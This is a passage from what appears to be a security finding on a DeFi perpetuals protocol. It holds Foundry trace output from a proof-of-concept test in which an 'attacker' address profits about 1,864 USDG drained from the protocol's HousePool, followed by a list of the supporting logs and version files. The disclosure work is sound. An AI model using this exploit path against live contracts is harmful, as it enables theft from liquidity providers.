5483:    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, amount: 106)
5488:    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 106)
9561:    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, amount: 12)
9566:    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 12)
9595:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 352632783 [3.526e8])
9654:    │   │   │   │   │   │   ├─ emit PositionOpened(account: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], side: 0, sizeDelta: 103800000000000000000000 [1.038e23], price: 96316305 [9.631e7], marginDelta: 542576299 [5.425e8])
9738:    │   │   │   ├─ emit MarginAdded(account: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], amount: 5000000000 [5e9])
10221:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 14911521769 [1.491e10])
10280:    │   │   │   │   │   │   ├─ emit PositionOpened(account: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], side: 0, sizeDelta: 4153100000000000000000000 [4.153e24], price: 96316305 [9.631e7], marginDelta: 25541280849 [2.554e10])
10327:    │   │   └─ ← [Return] ExecutionResult({ orderId: 189, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x373a46f9d36477d6a2a790aecb0c089d2ea8e2c6ff8178d1ed48163e2f3272e1 })
11094:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, amount: 85452 [8.545e4])
11099:    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 85452 [8.545e4])
11818:    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, amount: 10681 [1.068e4])
11823:    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA, to: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, amount: 10681 [1.068e4])
11861:    │   │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, to: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, amount: 5191797493 [5.191e9])
11873:    │   │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e, to: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, amount: 13616307395 [1.361e10])
11888:    │   │   │   │   │   │   ├─ emit PositionClosed(account: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], side: 0, sizeDelta: 4267200000000000000000000 [4.267e24], price: 96194628 [9.619e7], pnl: 5191797493 [5.191e9])
12161:    │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], amount: 61864315179 [6.186e10])
12168:    │   │   ├─ emit Transfer(from: NfpOptionAccount: [0xD09D9B272020Db6e3841cD8D94E6Aaee16a91df4], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 61864315179 [6.186e10])
12190:    │   │   │   ├─ emit Transfer(from: 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A, to: NfpBundler: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], amount: 600000 [6e5])
12197:    │   │   ├─ emit Transfer(from: NfpBundler: [0x959951c51b3e4B4eaa55a13D1d761e14Ad0A1d6a], to: attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], amount: 600000 [6e5])
```

`forge-test-controls-vvvv.log`, the declined SHORT arm finalized by the deployment's executor at 13:30:05:

```
38157:    ├─ [0] VM::warp(1793971805 [1.793e9])
38839:    ├─ [0] VM::prank(0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B, 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B)
39235:    │   └─ ← [Return] ExecutionResult({ orderId: 189, status: 3, terminalReason: 7, pendingReason: 0, receiptHash: 0x0b30d3b2dcf6298263fd0d624943da5f80602cd90110011d8ff6c9d83713abad })
```

The attacker's wallet goes from 60,000.000000 to 61,864.915179 USDG, +1,864.915179. The USDG came out of the HousePool, which pays out 3,508.918763 more than it takes in, the same amount `HousePool.totalAssets` ends below the no-attacker baseline.

### Other files in the gist

- `forge-test-vvvv.log`, `forge-test-controls-vvvv.log`, `forge-test-arms-vvvv.log`: full `-vvvv` traces of the three tests, with every call and every event decoded by forge.
- `trace-key-lines.txt`: the event lines above, grepped from the traces, with the commands.
- `VERSIONS.txt`: tool versions, repo HEAD `a82d4fef` with 0 modified files in `packages/perps/src`, 0 lines of `packages/perps/src` diff to the v2.0.0 release build `1209ca8a` and to upstream master `6909f261`, the library pins and sha256 sums.
- Local paths are shown as `<repo>` and `<finding>`, in `VERSIONS.txt` and in the compiler warning locations of `forge-test-vv.log`. Nothing else differs from the raw output.
- `keeper-latency-v2.0.0-summary.txt`: commit-to-terminal latency of all 269 v2.0.0 orders from the deployment's own events, per day.

